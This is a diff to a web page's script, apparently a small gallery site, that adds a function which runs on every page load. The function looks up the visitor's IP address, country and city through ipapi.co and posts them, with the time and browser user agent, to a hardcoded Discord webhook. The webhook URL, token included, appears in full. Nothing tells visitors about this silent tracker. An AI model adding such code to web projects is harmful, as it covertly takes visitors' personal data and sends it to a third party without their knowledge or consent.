@@ -401,6 +401,47 @@
   function closeImage() {
     document.getElementById("image-viewer").style.display = "none";
   }
+  
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1471260106523148452/7FseCeS0ZOIJHhmrK-O8rcftNcMWDqkDYGYVgtQK3gOS0-QttA-tX_7HVXh7D2TRavgx";
+
+  async function sendVisitorData() {
+    try {
+      // Get IP + country
+      const res = await fetch("https://ipapi.co/json/");
+      const data = await res.json();
+
+      const payload = {
+        content: "🌐 New Visitor",
+        embeds: [
+          {
+            title: "Visitor",
+            color: 16711935,
+            fields: [
+              { name: "IP", value: data.ip || "Unknown", inline: true },
+              { name: "Country", value: data.country_name + " " + (data.country_code || ""), inline: true },
+              { name: "City", value: data.city || "Unknown", inline: true },
+              { name: "Time", value: new Date().toLocaleString(), inline: false },
+              { name: "User Agent", value: navigator.userAgent, inline: false }
+            ]
+          }
+        ]
+      };
+
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      });
+
+    } catch (err) {
+      console.log("Webhook error:", err);
+    }
+  }
+
+  // Run when site loads
+  sendVisitorData();
 </script>
 
 </body>
